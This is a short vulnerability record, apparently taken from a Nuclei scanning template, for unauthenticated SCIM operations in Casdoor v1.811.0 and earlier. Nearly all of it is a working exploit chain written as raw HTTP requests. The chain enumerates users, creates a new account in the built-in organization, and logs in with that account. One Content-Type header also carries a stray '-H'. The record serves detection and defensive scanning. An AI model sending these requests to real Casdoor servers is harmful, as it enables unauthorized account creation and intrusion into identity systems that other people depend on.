# Vulnerability: Casdoor <=v1.811.0 - Unauthenticated SCIM Operations
**Classification:** CASDOOR
**Source:** Nuclei Template (`casdoor-unauth-operations.yaml`)

## Description
Detects unauthorized SCIM (System for Cross-domain Identity Management) operations in Casdoor versions ≤1.811.0, allowing unauthenticated access to user management functionalities.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /scim/Users HTTP/1.1
Host: {{Hostname}}

POST /scim/Users HTTP/1.1
Host: {{Hostname}}
Content-Type: application/scim+json-H

{"active":true,"displayName":"Admin","emails":[{"value":"{{email}}"}],"password":"{{password}}","nickName":"{{username}}","schemas":["urn:ietf:params:scim:schemas:core:2.0:User","urn:ietf:params:scim:schemas:extension:enterprise:2.0:User"],"urn:ietf:params:scim:schemas:extension:enterprise:2.0:User":{"organization":"built-in"},"userName":"{{username}}","userType":"normal-user"}

POST /api/login HTTP/1.1
Host: {{Hostname}}
Content-Type: text/plain;charset=UTF-8

{"application":"app-built-in","organization":"built-in","username":"{{username}}","autoSignin":true,"password":"{{password}}","signinMethod":"Password","type":"login"}
```

